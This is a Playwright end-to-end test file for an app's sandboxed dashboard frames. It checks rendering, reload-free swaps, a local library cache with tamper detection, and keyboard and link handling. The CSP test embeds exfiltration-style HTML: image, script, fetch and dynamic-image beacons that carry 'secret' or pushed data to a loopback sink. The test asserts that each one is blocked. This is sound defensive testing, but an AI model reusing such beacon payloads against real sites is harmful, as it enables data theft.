import { spawn } from 'node:child_process'
import { readFileSync, writeFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { expect, test, type APIRequestContext } from '@playwright/test'
import { attachConsoleErrors, e2eHomeDir, gotoApp } from './helpers'

/*
 * Agent dashboards, web host half (GDK-782/793; vendor GDK-792; libs
 * GDK-808) — against the real serve binary. The contracts this file pins:
 *
 *  1. opening from the sidebar renders the example dashboard inside the
 *     sandboxed frame and every datasource's data arrives (postMessage).
 *  2. `dashboards save` on an open dashboard swaps the whole frame without
 *     reloading the page — the GDK-793 p95 ≤ 1s authoring contract.
 *  3. the frame's own outbound attempts never reach the network: CSP refuses
 *     img/script/style/fetch to an external host before a request is made.
 *  4. libraries beyond uPlot come from the local lib cache (GDK-808):
 *     `lib add` downloads once (loopback mock CDN below — no real internet
 *     in any test), render executes the cached script (test 5) with zero
 *     render-time requests back to the host it was fetched from, and cache
 *     bytes tampered after the add refuse to serve — no execution, and the
 *     injected tag's onerror marker is visible to the document (test 6).
 *
 * Fixture hygiene: dashboard rows live in local.db, which serve.sh seeds
 * fresh per server start — but reuseExistingServer keeps one server alive
 * across local runs, so every test names its rows with PREFIX and the sweep
 * in beforeAll/afterAll deletes them (a crashed run is cleaned by the next
 * run's beforeAll). Lib cache entries are `lib rm`-ed by the tests that
 * added them; a crashed run leaves bytes that the next run's identical-mock
 * re-add turns into an idempotent `present`.
 */

const E2E_DIR = dirname(fileURLToPath(import.meta.url))
const RUN = Date.now().toString(36)
const PREFIX = 'E2E Dash'
const FRAME_SEL = 'iframe[data-testid="dashboard-frame"]'
const GADAK_BIN = join(E2E_DIR, '.tmp', 'gadak')
const GADAK_HOME = e2eHomeDir()

/** The example's own registration comment is the source of truth for these. */
const TRIAGE_DS = {
  by_status: {
    sql: 'select status_category, count(*) as n from issues_full group by 1 order by 1',
  },
  top_open: {
    sql: "select key, priority_rank, summary from issues_full where status_category != 'done' order by priority_rank, updated_at desc limit 8",
  },
  monthly_opened: {
    sql: "select strftime('%s', substr(created_at, 1, 7) || '-01') as t, count(*) as n from issues_full where created_at >= date('now', '-11 months') group by 1 order by 1",
  },
  mine: { jql: 'assignee = currentUser() AND resolution is EMPTY' },
}

const TOTAL_DS = { total: { sql: 'select count(*) as n from issues_full' } }

type SavedRow = { id: string; name: string }

async function saveDash(
  request: APIRequestContext,
  name: string,
  html: string,
  datasources: Record<string, { sql?: string; jql?: string }>,
  libs?: string[],
): Promise<SavedRow> {
  const res = await request.post('/api/v1/dashboards/', {
    data: { name, config: { html, datasources, ...(libs ? { libs } : {}) } },
  })
  expect(res.status(), `save ${name} failed: ${await res.text()}`).toBe(201)
  return (await res.json()) as SavedRow
}

/** Delete every dashboard this file (or a crashed earlier run) created. */
async function sweep(request: APIRequestContext): Promise<void> {
  const res = await request.get('/api/v1/dashboards/')
  if (!res.ok()) return
  const { dashboards } = (await res.json()) as { dashboards: SavedRow[] }
  for (const d of dashboards) {
    if (d.name.startsWith(PREFIX)) await request.delete(`/api/v1/dashboards/${d.id}/`)
  }
}

/** Minimal authored document: a version marker plus the pushed row count. */
function markerHtml(marker: string): string {
  return `<!doctype html><html><body style="font: 14px sans-serif">
<div data-testid="dash-version">${marker}</div>
<div id="pushed">waiting</div>
<script>
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent =
    String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0') + (d.warning ? ' warn:' + d.warning : '');
});
</script>
</body></html>`
}

test.beforeAll(async ({ request }) => {
  await sweep(request)
})
test.afterAll(async ({ request }) => {
  await sweep(request)
})

test('open from the sidebar renders the example wall and every datasource arrives', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} triage`
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, name, html, TRIAGE_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page).toHaveURL(/dash=/)

  const fl = page.frameLocator(FRAME_SEL)
  // Data arrival: the stamp counts datasources that pushed (a failed one
  // still pushes, with a warning), and the open-count card left its dash.
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  // Non-zero: the demo pool always has open work (see DEMO_ISSUE_COUNT for
  // the single-owner constant pattern this intentionally avoids).
  await expect(fl.locator('#n-open')).toHaveText(/^[1-9][0-9]*$/)
  // GDK-792, in situ: uPlot loaded from the vendor route and drew a canvas.
  await expect(fl.locator('#monthly canvas').first()).toBeVisible()
})

test('the dash= URL param restores the dashboard on a cold boot', async ({ page }) => {
  const saved = await saveDash(
    page.request,
    `${PREFIX} ${RUN} restore`,
    markerHtml('v1'),
    TOTAL_DS,
  )
  // Cold boot straight into the param — no sidebar, restore-before-bind.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  // The first push landed too — restore is not a blank frame.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  await page.getByTestId('dashboard-close').click()
  await expect(page.getByTestId('dashboard-view')).toBeHidden()
  await expect(page.getByTestId('issue-layout')).toBeVisible()
})

test('save on an open dashboard swaps the frame without a reload (p95 <= 1s)', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} swap`
  const saved = await saveDash(page.request, name, markerHtml('v1'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  // A page reload would wipe this; a frame swap must not touch it.
  await page.evaluate(() => {
    ;(window as { __e2eNoReload?: number }).__e2eNoReload = 1
  })

  const samples: number[] = []
  for (let gen = 1; gen <= 3; gen++) {
    const t0 = Date.now()
    await saveDash(page.request, name, markerHtml(`v${gen + 1}`), TOTAL_DS)
    // renderGen is the swap signal: the {#key} wrapper re-created the frame.
    await expect(page.locator(FRAME_SEL)).toHaveAttribute('data-render-gen', String(gen), {
      timeout: 5000,
    })
    await expect(fl.getByTestId('dash-version')).toHaveText(`v${gen + 1}`)
    // And the new document got its first push (the swap contract is
    // "replace, then push" — not "replace and go dark").
    await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
    samples.push(Date.now() - t0)
  }

  samples.sort((a, b) => a - b)
  const median = samples[1]
  console.log(`[dashboards] save→swap samples ${samples.join('/')}ms (median ${median}ms)`)
  expect(
    median,
    `save→swap median ${samples.join('/')}ms — over the 1s p95 contract (0.5s poll + one row fetch)`,
  ).toBeLessThanOrEqual(1000)
  expect(Math.max(...samples)).toBeLessThan(4000)
  expect(await page.evaluate(() => (window as { __e2eNoReload?: number }).__e2eNoReload)).toBe(1)
})

test("the frame's outbound attempts are refused before any socket is opened", async ({ page }) => {
  // The observable matters. Chromium creates a request OBJECT for a
  // CSP-refused subresource and then discards it before connecting — so
  // page.on('request') / devtools' network panel show canceled entries for
  // loads that never sent a byte (measured here during GDK-792: 4 CDP
  // request events, 0 TCP connections). The contract this test pins is at
  // the socket: a loopback sink receives nothing. The sink is also the
  // containment — even on a CSP regression, the "external" host is 127.0.0.1.
  const received: string[] = []
  const sink: Server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    // The external script must be executable if it ever arrives: a 404 would
    // mask a CSP regression as a load error. Serving it is what makes the
    // in-frame #ext assertion meaningful.
    if ((req.url ?? '').includes('static-js')) {
      res.writeHead(200, { 'content-type': 'application/javascript' })
      res.end("document.getElementById('ext').textContent = 'EXECUTED';")
      return
    }
    res.writeHead(404)
    res.end()
  })
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', resolve))
  const sinkPort = (sink.address() as { port: number }).port
  const beacon = (path: string) => `http://127.0.0.1:${sinkPort}/${path}`

  const html = `<!doctype html><html><head>
<link rel="stylesheet" href="${beacon('static-css?d=secret')}">
<script src="${beacon('static-js?d=secret')}"></script>
</head><body>
<img src="${beacon('static-pixel?d=secret')}"
     onload="document.getElementById('img').textContent = 'LOADED (leak)'"
     onerror="document.getElementById('img').textContent = 'refused'">
<div id="img">pending</div>
<div id="fetch">pending</div>
<div id="ran">no</div>
<div id="ext">no</div>
<div id="dyn">pending</div>
<div id="pushed">waiting</div>
<script>
document.getElementById('ran').textContent = 'yes';
fetch('${beacon('fetch-beacon?d=secret')}').then(
  function () { document.getElementById('fetch').textContent = 'LOADED (leak)'; },
  function (e) { document.getElementById('fetch').textContent = 'refused ' + e.name; }
);
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent = String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0');
  // The exfiltration shape that matters: pushed mirror data encoded into a
  // dynamically constructed subresource URL after it arrives.
  var b = document.createElement('img');
  b.src = '${beacon('dyn-beacon')}?d=' + encodeURIComponent(document.getElementById('pushed').textContent);
  b.onload = function () { document.getElementById('dyn').textContent = 'LOADED (leak)'; };
  b.onerror = function () { document.getElementById('dyn').textContent = 'refused'; };
  document.body.appendChild(b);
});
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} blockednet`, html, TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  // The document itself ran, and each channel was refused in-frame: no
  // external script executed, image/fetch got errors, not content…
  await expect(fl.locator('#ran')).toHaveText('yes')
  await expect(fl.locator('#ext')).toHaveText('no')
  await expect(fl.locator('#fetch')).toHaveText(/^refused /)
  await expect(fl.locator('#img')).toHaveText('refused')
  // …while the host side kept working (pushes are the parent's job), and the
  // dynamic beacon built FROM pushed data was refused too.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  await expect(fl.locator('#dyn')).toHaveText('refused')
  // The duration is the assertion window: any refused-but-issued load, or a
  // deferred beacon, would land on the sink inside it.
  await page.waitForTimeout(800)
  expect(
    received,
    `requests reached a socket: ${received.join(', ')} (CSP refused them only in-frame)`,
  ).toEqual([])
  sink.close()
})

/*
 * The lib cache, end to end (GDK-808). "CDN" below is a loopback mock —
 * no test in this file talks to the internet — and it doubles as the TCP
 * sink: it counts every request that ever reaches it, so "the library was
 * downloaded once, at add time, and never again" is a socket-level claim,
 * not a devtools-panel one (same discipline as the blockednet test above).
 */

/** Mock CDN serving one fixed library body, counting every request. */
async function mockCDN(body: string): Promise<{
  server: Server
  url: (p: string) => string
  received: string[]
}> {
  const received: string[] = []
  const server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    res.writeHead(200, { 'content-type': 'application/javascript' })
    res.end(body)
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const port = (server.address() as { port: number }).port
  return { server, url: (p: string) => `http://127.0.0.1:${port}/${p}`, received }
}

/**
 * Run the e2e CLI binary against the e2e home (the serve's own home).
 * Async spawn, not spawnSync: the mock CDN lives in this same worker
 * process, and a sync spawn freezes the event loop that must answer the
 * child's HTTP request (measured: spawnSync deadlocks lib add into its
 * own timeout).
 */
function runGadak(args: string[]): Promise<{ status: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(GADAK_BIN, args, { env: { ...process.env, GADAK_HOME: GADAK_HOME } })
    let stdout = ''
    let stderr = ''
    child.stdout.on('data', (d) => (stdout += d))
    child.stderr.on('data', (d) => (stderr += d))
    child.on('error', reject)
    child.on('close', (status) => resolve({ status: status ?? -1, stdout, stderr }))
  })
}

/** Pick the value of one `key\tvalue` line out of a TSV stdout. */
function tsvField(out: string, key: string): string {
  const line = out.split('\n').find((l) => l.startsWith(`${key}\t`))
  return line ? line.slice(key.length + 1).trim() : ''
}

/** A document that reports whether the cached lib ran, defensively. */
const libHtml = `<!doctype html><html><head></head><body style="font: 14px sans-serif">
<div id="lib-ran">pending</div>
<div id="lib-error">none</div>
<script>
// Inline registers first; defer scripts (the injected lib tag) run after
// parse but before DOMContentLoaded — so DCL is the first moment that can
// judge both "the lib executed" and "the injected tag errored".
document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('lib-ran').textContent =
    window.__e2eDemoLib ? 'loaded' : 'missing';
  var bad = document.documentElement.getAttribute('data-gadak-lib-error');
  if (bad) document.getElementById('lib-error').textContent = 'lib failed: ' + bad;
});
</script>
</body></html>`

test('lib add caches once and render executes it with zero requests back to its origin', async ({
  page,
}) => {
  const cdn = await mockCDN('window.__e2eDemoLib = {ran: true};\n')
  const url = cdn.url('demo-lib.iife.js')

  // The one user-invoked download. Same bytes on a crashed earlier run →
  // `present` with the same id; both verbs carry the id on line 1.
  const ran = await runGadak(['dashboards', 'lib', 'add', url])
  expect(ran.status, ran.stderr || ran.stdout).toBe(0)
  const id = tsvField(ran.stdout, 'added') || tsvField(ran.stdout, 'present')
  expect(id, `lib add stdout:\n${ran.stdout}`).toMatch(/^[0-9a-f]{16}-demo-lib\.iife\.js$/)
  expect(tsvField(ran.stdout, 'url')).toBe(url)
  expect(tsvField(ran.stdout, 'sha384')).toMatch(/^[0-9a-f]{96}$/)
  // The add-time download is the only request so far.
  expect(cdn.received, `mock CDN saw: ${cdn.received.join(', ')}`).toEqual(['GET /demo-lib.iife.js'])

  try {
    const saved = await saveDash(page.request, `${PREFIX} ${RUN} libok`, libHtml, {}, [id])
    await gotoApp(page)
    await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
    const fl = page.frameLocator(FRAME_SEL)
    // The cached script executed inside the frame: the lib global exists.
    await expect(fl.locator('#lib-ran')).toHaveText('loaded')
    await expect(fl.locator('#lib-error')).toHaveText('none')
    // GDK-808's network claim, at the socket: rendering fetched the lib from
    // the local route, and nothing re-contacted the host it came from. The
    // window is the assertion (a deferred or retrying fetch would land in it).
    await page.waitForTimeout(800)
    expect(
      cdn.received,
      `render-time request(s) reached the lib's origin: ${cdn.received.join(', ')}`,
    ).toEqual(['GET /demo-lib.iife.js'])
  } finally {
    cdn.server.close()
    await runGadak(['dashboards', 'lib', 'rm', id])
  }
})

test('cache bytes tampered after lib add refuse to serve — no execution, visible failure', async ({
  page,
}) => {
  const cdn = await mockCDN('window.__e2eDemoLib = {ran: true};\n')
  const ran = await runGadak(['dashboards', 'lib', 'add', cdn.url('demo-lib.iife.js')])
  expect(ran.status, ran.stderr || ran.stdout).toBe(0)
  const id = tsvField(ran.stdout, 'added') || tsvField(ran.stdout, 'present')
  const path = tsvField(ran.stdout, 'path')
  expect(Boolean(id && path), `lib add stdout:\n${ran.stdout}`).toBeTruthy()

  // Tamper the cached bytes on disk, after the pin was written. The restore
  // in finally is not politeness: a tampered file left behind would make the
  // next run's same-url add refuse ("changed since cached") forever.
  const pinned = readFileSync(path, 'utf8')
  writeFileSync(path, 'window.__e2eDemoLib = {ran: true, evil: true}; // tampered\n')
  try {
    const saved = await saveDash(page.request, `${PREFIX} ${RUN} libtamper`, libHtml, {}, [id])
    await gotoApp(page)
    await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
    const fl = page.frameLocator(FRAME_SEL)
    // The serve route re-hashed the bytes against the pin, answered 500, and
    // the script never executed — the tampered global is absent.
    await expect(fl.locator('#lib-ran')).toHaveText('missing')
    // The injected tag's onerror marker is on the document element, and the
    // defensive dashboard showed it as a broken card instead of a silent gap.
    await expect(fl.locator('#lib-error')).toHaveText(`lib failed: ${id}`)
  } finally {
    writeFileSync(path, pinned) // leave the cache as the add left it
    cdn.server.close()
    await runGadak(['dashboards', 'lib', 'rm', id])
  }
})

/*
 * GDK-815: a dashboard holds the whole main column, so the two contracts
 * every other full-column surface keeps must hold for it too.
 *
 *  1. Applying a view releases the column (showIssueList closed feed/docs/
 *     history but not the dashboard — the list painted behind it).
 *  2. While the dashboard holds the column, no view row claims "you are
 *     here" (mainColumnIsList did not look at dashboards.openId, so the
 *     built-in rows stayed tinted beside a screen that was not the list).
 *
 * The row locator is the one sidebar-active.spec.ts reads — aria-current
 * rides the same condition that paints the row, so a token rename cannot
 * turn this green or red.
 */
test('GDK-815: applying a view releases the column from a dashboard, and the view row re-tints', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} release`, markerHtml('release'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page.locator(FRAME_SEL)).toBeVisible()

  // Hole 2: the dashboard owns the column, so the view tint is not any
  // view's to claim. The dashboard's own row is a place-row like the docs
  // rows and stays excluded: it marks where the person is, not a list.
  const activeViewRows = page.locator(
    'aside nav button[aria-current="true"]:not([data-testid^="docs-"]):not([data-testid="sidebar-dashboard-row"])',
  )
  await expect(activeViewRows).toHaveCount(0)

  // Hole 1: a view row click hands the column to the list. 'All open' is the
  // builtin row nav-issue.spec.ts uses for the same DOCS→list gesture — a
  // fresh home has no saved views for sidebar-view-row to point at.
  await page.getByRole('button', { name: 'All open' }).click()
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-list-scroller')).toBeVisible()
  await expect(activeViewRows.first()).toHaveAttribute('aria-current', 'true')

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
})

/*
 * GDK-827: Esc closes the dashboard — the feed's slot in the chain, i.e.
 * only after browse/menu/bulk/detail had their turn. And the honest edge of
 * this surface: clicking into the sandboxed frame moves key events into the
 * frame's own document, so the parent's Esc cannot reach the dashboard while
 * the frame holds focus. The probe pins that observed fact (so a browser
 * change to it turns this red) and the recovery — any click outside the
 * frame returns keys to the parent document and Esc closes.
 */
test('GDK-827: Esc closes the dashboard; a focused frame swallows the key and a click outside recovers', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} esc`, markerHtml('esc'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page.locator(FRAME_SEL)).toBeVisible()

  // Focus outside the frame: the main contract.
  await page.keyboard.press('Escape')
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-list-scroller')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastKeyCmd)).toBe(
    'close-dashboard',
  )

  // Probe: click into the frame, then Esc. The marker is cleared first —
  // dataset.lastKeyCmd is a sticky high-water mark, so without the reset a
  // swallowed key would read as "close-dashboard ran" off the earlier press.
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await page.evaluate(() => delete document.documentElement.dataset.lastKeyCmd)
  await page.locator(FRAME_SEL).click()
  await page.keyboard.press('Escape')
  // The parent handler never ran — the dashboard is still up and no command
  // was recorded for this press.
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  expect(await page.evaluate(() => document.documentElement.dataset.lastKeyCmd)).toBeUndefined()

  // Recovery: a click outside the frame, then Esc closes.
  await page.getByTestId('dashboard-view').locator('header').click()
  await page.keyboard.press('Escape')
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
})

/*
 * GDK-854: links out of the wall. Two channels, each pinned at the point
 * where it could silently regress:
 *
 *  1. `open` — the frame→parent navigation verb. The wall posts
 *     {type:'open', hash:'#/?issue=<key>'}; the app itself navigates (its
 *     own router, its own grammar), the dashboard releases the column, and
 *     the issue's detail opens. A dropped/ignored verb shows up as "the URL
 *     never moved".
 *  2. an external `<a target="_blank" rel="noopener">` — allowed by the
 *     sandbox's allow-popups (without it Chromium blocks the auxiliary
 *     navigation outright). The popup event IS the new tab; the loopback
 *     sink doubles as containment (the "external" host is 127.0.0.1) and as
 *     the success signal — one request from the click gesture. And the wall
 *     itself must still be there afterwards: the failure mode this guards
 *     against is the anchor navigating the *frame* to the URL (residual
 *     channel #1), which replaces the authored document with the sink's.
 */
test('links out of the wall: open navigates in-app, an external link opens a new tab, the frame stays put', async ({
  page,
}) => {
  const errors = attachConsoleErrors(page)

  const received: string[] = []
  const sink: Server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    res.writeHead(200, { 'content-type': 'text/html' })
    res.end('<!doctype html><title>external tab</title>')
  })
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', resolve))
  const sinkPort = (sink.address() as { port: number }).port

  // A real key from the pool: the verb's contract is "navigate to this
  // issue", so the scene uses an issue the mirror actually has.
  await gotoApp(page)
  const key = await page
    .locator('[data-testid="issue-list-scroller"] [data-issue-key]')
    .first()
    .getAttribute('data-issue-key')
  expect(key, 'no issue key in the demo list').toBeTruthy()

  const html = `<!doctype html><html><body style="font: 14px sans-serif">
<div data-testid="dash-version">links</div>
<button id="go-issue" type="button">open ${key}</button>
<a id="ext" href="http://127.0.0.1:${sinkPort}/ext-link" target="_blank" rel="noopener">external</a>
<div id="pushed">waiting</div>
<script>
document.getElementById('go-issue').addEventListener('click', function () {
  parent.postMessage({ type: 'open', hash: '#/?issue=${key}' }, '*');
});
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent =
    String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0') + (d.warning ? ' warn:' + d.warning : '');
});
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} links`, html, TOTAL_DS)

  // The sidebar fetched its dashboard list at boot, before this save — open
  // via the `dash=` param instead: same live binding a link would ride.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('links')
  // The host side kept working while the wall grew links.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  // The sandbox grants popups and nothing else new: no same-origin, no
  // top-navigation. Pin the attribute so a flag removal goes red even if a
  // browser change keeps the click working some other way.
  await expect(page.locator(FRAME_SEL)).toHaveAttribute(
    'sandbox',
    'allow-scripts allow-popups allow-popups-to-escape-sandbox',
  )

  // 2. External link: a new tab opens, the wall does not move.
  const popupPromise = page.waitForEvent('popup', { timeout: 10_000 })
  await fl.locator('#ext').click()
  const tab = await popupPromise
  await expect(tab).toHaveURL(/\/ext-link$/)
  await expect
    .poll(() => received.join(' | '), 'the popup navigation reached the sink')
    .toContain('GET /ext-link')
  await tab.close()
  await expect(fl.getByTestId('dash-version')).toHaveText('links')
  await expect(page.locator(FRAME_SEL)).toHaveAttribute('src', /\/render\/$/)

  // 1. In-app link: the app navigates itself, the column leaves the wall.
  await fl.locator('#go-issue').click()
  const keyRe = key!.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  await expect(page).toHaveURL(new RegExp(`[?&]issue=${keyRe}([&#]|$)`))
  await expect(page.getByTestId('dashboard-view')).toHaveCount(0)
  await expect(page.getByTestId('issue-detail-panel')).toBeVisible()

  expect(errors, `console errors:\n${errors.join('\n')}`).toEqual([])
  sink.close()
})
